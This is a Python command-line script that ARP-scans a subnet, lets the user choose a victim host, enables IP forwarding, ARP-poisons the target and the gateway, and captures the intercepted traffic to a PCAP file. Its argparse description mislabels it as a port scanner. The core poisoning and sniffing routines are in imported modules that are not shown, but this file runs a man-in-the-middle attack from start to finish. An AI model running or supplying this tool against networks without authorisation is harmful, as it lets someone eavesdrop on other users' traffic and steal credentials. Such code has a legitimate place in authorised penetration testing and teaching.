#!/usr/bin/python3

import argparse
import socket
import sys
import time

import os

from network.inet.inet_tools import get_ip_forward, set_ip_forward, is_cidr, is_single_ip
from network.inet.interface import get_default_gateway, get_interfaces, get_physical_addresses
from network.socket.arp import Arp, get_mac


class PermissionException(Exception):
    """Raised when process is not running under sudo"""
    pass


TARGET_HELP = """Target address to scan, this can be:
 A CIDR range: i.e. 192.168.0/24 
 A Single IP: i.e. 192.168.0.2
 
 If a CIDR range is supplied, an ARP scan will be performed and a choice of targets will be given."""
TIMEOUT_HELP = """Maximum time in fractional seconds to sniff for packets."""
RESOLVE_HELP = """Attempt to resolve hostnames"""
FILE_HELP = """Filename to write PCAP file to"""
GATEWAY_HELP = """IP Address of the gateway"""
INTERFACE_HELP = """Name of the network interface to capture packets on: i.e. eth0"""


def parse_args():
    parser = argparse.ArgumentParser(description="Port scanner", formatter_class=argparse.RawTextHelpFormatter)
    parser.add_argument('target', nargs='?', default=None, help=TARGET_HELP)
    parser.add_argument('-o', '--output', action='store', dest='out_file', help=FILE_HELP)
    parser.add_argument('-g', '--gateway', action='store', dest='gateway', help=GATEWAY_HELP)
    parser.add_argument('-i', '--interface', action='store', dest='interface', help=INTERFACE_HELP)
    parser.add_argument('-w', '--wait', action='store', dest='wait_time', default=3, type=float, help=TIMEOUT_HELP)
    parser.add_argument('-r', '--resolve', action='store_true', dest='resolve', default=True, help=RESOLVE_HELP)

    return parser.parse_args()


def main():
    args = parse_args()

    if args.target is None or (not is_cidr(args.target) and not is_single_ip(args.target)):
        args.print_help(sys.stderr)
        sys.exit(1)

    if 'SUDO_UID' not in os.environ.keys():
        print("This must be run with sudo permissions")
        raise PermissionException

    ip_forward_state = get_ip_forward()

    ip_range = args.target
    wait_time = args.wait_time
    resolve = args.resolve
    pcap_file = args.out_file
    gateway = args.gateway
    interface_name = args.interface

    if gateway is None:
        gateway = get_default_gateway(socket.AF_INET)
        print(f"Detected default gateway as {gateway}")

    set_ip_forward(True)

    arp = Arp(wait_time, pcap_file=pcap_file)

    arp_responses = arp.arp_scan(ip_range, resolve=True)
    gateway_mac = get_mac(gateway, arp_responses)
    broadcast = '.'.join(gateway.split('.')[:3]) + '.255'
    remove_address(arp_responses, gateway, broadcast)
    show_arp_responses(arp_responses)

    if is_cidr(args.target):
        total_arps = len(arp_responses)

        choice = int(input(f"\nChoose target (1 - {total_arps}):"))
        if choice < 1 or choice > total_arps:
            print("Invalid choice")
            return

        target_ip = arp_responses[choice - 1].ip
    else:
        target_ip = args.target

    target_mac = get_mac(target_ip, arp_responses)

    print(f"Target {target_ip} - {target_mac} ")
    print(f"Gateway {gateway} - {gateway_mac}")

    if interface_name is None:
        interface_name = choose_interface()

    print(f"Using adapter {interface_name}")

    print(f"\nSending ARP poison to {target_ip} via {gateway}", flush=True)

    arp.start(gateway, gateway_mac, target_ip, target_mac)

    print(f"Capturing packets on {interface_name}", flush=True)

    sniff_fn = arp.sniff_packets(interface_name)

    time.sleep(10)
    print(f"Packets written to {pcap_file}")

    sniff_fn.stop()

    arp.shutdown()

    if not ip_forward_state:
        set_ip_forward(ip_forward_state)
        print("Reset IP forwarding rules")


def choose_interface():
    interfaces = get_interfaces()
    physical = get_physical_addresses(interfaces)
    for iface in interfaces:
        iface.resolve_hostnames()
    adapter = 1
    if len(physical) > 1:
        for nic in physical:
            print(f"{adapter:6}\t{nic.name}")
        adapter = int(input(f"\nChoose adapter (1 - {adapter - 1}):"))

    return physical[adapter - 1].name


def show_arp_responses(arp_responses):
    print("Target\tIP Address     \tMac Address\t        Hostname")
    item = 1
    for address in arp_responses:
        print(f"{item:6}\t{address.ip:15}\t{address.mac}\t{address.host}")
        item += 1


def remove_address(arp_responses, gateway, broadcast):
    # Find the gateway and remove it from the arp responses
    gateway_position = next((i for i, item in enumerate(arp_responses) if item.ip == gateway), None)
    if gateway_position is not None:
        arp_responses.pop(gateway_position)

    # Find the broadcast address (x.x.x.255) and remove it from the arp responses
    broadcast_position = next((i for i, item in enumerate(arp_responses) if item.ip == broadcast), None)
    if broadcast_position is not None:
        arp_responses.pop(broadcast_position)


def get_gateway_address(adapter, physical, family):
    return next(item for item in physical[adapter].address if item.family == family).gateway


if __name__ == '__main__':
    main()

    # interfaces = get_interfaces()
    # physical = get_physical_addresses(interfaces)
    # interface_name = physical[adapter-1].name
    # gateway4 = get_gateway_address(adapter - 1, physical, AF_INET)
    # gateway6 = get_gateway_address(adapter - 1, physical, AF_INET6)
